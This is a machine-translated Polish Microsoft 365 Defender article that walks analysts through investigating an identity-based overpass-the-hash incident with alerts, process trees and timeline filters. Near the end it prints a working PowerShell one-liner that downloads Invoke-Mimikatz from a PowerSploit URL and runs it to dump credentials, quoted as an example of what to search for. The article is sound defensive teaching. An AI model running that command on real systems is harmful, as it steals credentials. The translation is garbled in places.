---
title: Przykładowy atak oparty na tożsamości
description: Przesuń się przez przykładową analizę ataków opartych na tożsamości.
keywords: zdarzenia, alerty, badanie, korelacja, atak, komputery, urządzenia, użytkownicy, tożsamości, tożsamość, skrzynka pocztowa, poczta e-mail, 365, microsoft, m365, reagowanie na incydenty, cyberataki
search.product: eADQiWindows 10XVcnh
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dansimp
author: dansimp
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365initiative-m365-defender
ms.topic: conceptual
search.appverid:
- MOE150
- MET150
ms.technology: m365d
ms.openlocfilehash: 20b9fca87e003c0c776c9f614afaa1b6054c24a5
ms.sourcegitcommit: 3b8e009ea1ce928505b8fc3b8926021fb91155f3
ms.translationtype: MT
ms.contentlocale: pl-PL
ms.lasthandoff: 03/28/2022
ms.locfileid: "64500282"
---
# <a name="example-of-an-identity-based-attack"></a>Przykładowy atak oparty na tożsamości

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]

**Dotyczy:**
- Microsoft 365 Defender

Microsoft Defender for Identity pomóc w wykryciu złośliwych prób naruszenia tożsamości w organizacji. Ponieważ program Defender for Identity jest zintegrowany z programem Microsoft 365 Defender, analitycy zabezpieczeń mogą mieć wgląd w zagrożenia pochodzące z usługi Defender for Identity, takie jak podejrzewane próby podwyższenia uprawnień użytkownika Netlogon.

## <a name="analyzing-the-attack-in-microsoft-defender-for-identity"></a>Analizowanie ataków w programie Microsoft Defender for Identity

Microsoft 365 Defender umożliwia analitykom filtrowanie alertów przez wykrywanie źródła na karcie **Alerty** na stronie zdarzeń. W poniższym przykładzie źródło wykrywania jest filtrowane do usługi **Defender for Identity**. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png" alt-text="Filtrowanie źródła wykrywania w Microsoft Defender for Identity" lightbox="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png":::

Wybranie **alertu o podejrzewanym** o wmięcie krzyżyka powoduje wyświetlenie strony w programie Microsoft Defender for Cloud Apps która zawiera bardziej szczegółowe informacje. Zawsze możesz dowiedzieć się więcej o alertach lub atakach, wybierając pozycję Dowiedz się więcej o tym typie **alertu**[, aby przeczytać](/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) opis sugestii dotyczących ataków i działań naprawczych.
 
:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-alert-example.png" alt-text="A suspected overpass-the-hash attack alert" lightbox="../../media/first-incident-path-identity/first-incident-identity-alert-example.png"::: 

## <a name="investigating-the-same-attack-in-microsoft-defender-for-endpoint"></a>Badanie tego samego ataku w Ochrona punktu końcowego w usłudze Microsoft Defender

Alternatywnie analityk może użyć usługi Defender for Endpoint, aby dowiedzieć się więcej o aktywności w punkcie końcowym. Wybierz zdarzenie z kolejki zdarzeń, a następnie wybierz **kartę Alerty** . W tym miejscu także mogą zidentyfikować źródło wykrywania. Źródło wykrywania oznaczone jako EDR oznacza Endpoint Detection and Response (Wykrywanie punktu końcowego i odpowiedzi), czyli Defender for Endpoint (Punkt końcowy). W tym miejscu analityk wybiera alert wykryty przez EDR.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png" alt-text="Wykrywanie punktu końcowego i odpowiedź w portalu Ochrona punktu końcowego w usłudze Microsoft Defender sieci Web" lightbox="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png"::: 

Na stronie alertu są wyświetlane różne istotne informacje, takie jak nazwa urządzenia, nazwa użytkownika, stan automatycznego badania i szczegóły alertu. Historia alertów przedstawia wizualną reprezentację drzewa procesu. Drzewo procesu jest hierarchiczną reprezentacją procesów nadrzędnych i podrzędnych powiązanych z alertem.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png" alt-text="Drzewo procesu alertu w Ochrona punktu końcowego w usłudze Microsoft Defender" lightbox="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png"::: 

Każdy proces można rozwinąć, aby wyświetlić więcej szczegółów. Szczegóły, które może zobaczyć analityk, to rzeczywiste polecenia wprowadzone w ramach złośliwego skryptu, adresy IP połączeń wychodzących i inne przydatne informacje.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-process-details.png" alt-text="Szczegóły procesu w portalu Ochrona punktu końcowego w usłudze Microsoft Defender klienta" lightbox="../../media/first-incident-path-identity/first-incident-identity-process-details.png":::
 
Wybierając pozycję **Zobacz na osi czasu**, analityk może jeszcze bardziej przejść do szczegółów w celu określenia dokładnego czasu naruszenia. 

Ochrona punktu końcowego w usłudze Microsoft Defender wykrywać wiele złośliwych plików i skryptów. Jednak z powodu wielu legalnych zastosowań połączeń wychodzących, programu PowerShell i działań w wierszu polecenia niektóre działania będą uznawane za ważne do czasu, aż zostanie w wyniku tego złośliwy plik lub działanie. Dlatego korzystanie z osi czasu ułatwia analitykom stosowanie alertu w kontekście otaczającego go działania w celu określenia pierwotnego źródła lub czasu ataków, które w innym przypadku jest przesłonięte przez wspólny system plików i działania użytkowników. 

Aby użyć osi czasu, analityk uruchamiał się w momencie wykrywania alertu (w kolorze czerwonym) i przewijał w dół w czasie, aby ustalić, kiedy pierwotne działanie, które w rzeczywistości spowodowało złośliwe działanie. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-start-time.png" alt-text="Czas rozpoczęcia pracy analityka dla wykrywania alertu" lightbox="../../media/first-incident-path-identity/first-incident-identity-start-time.png"::: 

Ważne jest zrozumienie i rozróżnienie typowych działań, takich jak połączenia usługi Windows Update Windows, ruch aktywacji zaufanego oprogramowania, inne typowe połączenia z witrynami firmy Microsoft, aktywność internetowa innych firm, działania Microsoft Endpoint Configuration Manager i inne aktywność ekwiązyjna przed podejrzanymi działaniami aktywność. Jednym ze sposobów rozróżniania jest korzystanie z filtrów osi czasu. Istnieje wiele filtrów, które mogą wyróżniać określone działania podczas odfiltrowania danych, których analityk nie chce wyświetlać. 

Na poniższej ilustracji analityk przefiltrował wyświetlanie tylko zdarzeń sieci i procesów. Te kryteria filtru umożliwiają analitykowi wyświetlanie połączeń sieciowych i procesów otaczających zdarzenie, w którym program Notatnik nawiągł połączenie z adresem IP, co było również widać w drzewie procesu. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-notepad.png" alt-text="Jak Notatnik w celu nawiązaniu złośliwego połączenia wychodzącego" lightbox="../../media/first-incident-path-identity/first-incident-identity-notepad.png"::: 

W tym konkretnym zdarzeniu Notatnik zostało użyte do nawiązaniu złośliwego połączenia wychodzącego. Jednak często atakujący używają oprogramowania iexplorer.exe do nawiązywania połączeń w celu pobrania złośliwego ładowania, ponieważ zwykle iexplorer.exe są uznawane za zwykła aktywność w przeglądarkach internetowych.

Innym elementem do wyszukiwania na osi czasu będzie program PowerShell używany do połączeń wychodzących. Analityk będzie szukać skutecznych połączeń programu PowerShell z poleceniami `IEX (New-Object Net.Webclient)` , takimi jak połączenia wychodzące z witryną internetową hostującym złośliwy plik. 

W poniższym przykładzie program PowerShell został użyty do pobrania i wykonania mimikatz z witryny internetowej:

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```
Analityk może szybko wyszukać słowa kluczowe, wpisując słowo kluczowe na pasku wyszukiwania, aby wyświetlić tylko zdarzenia utworzone za pomocą programu PowerShell. 

## <a name="next-step"></a>Następny krok

Zobacz [ścieżkę badania wyłudzania](first-incident-path-phishing.md) informacji.

## <a name="see-also"></a>Zobacz też

- [Omówienie zdarzeń](incidents-overview.md)
- [Zarządzanie zdarzeniami](manage-incidents.md)
- [Badanie zdarzeń](investigate-incidents.md)
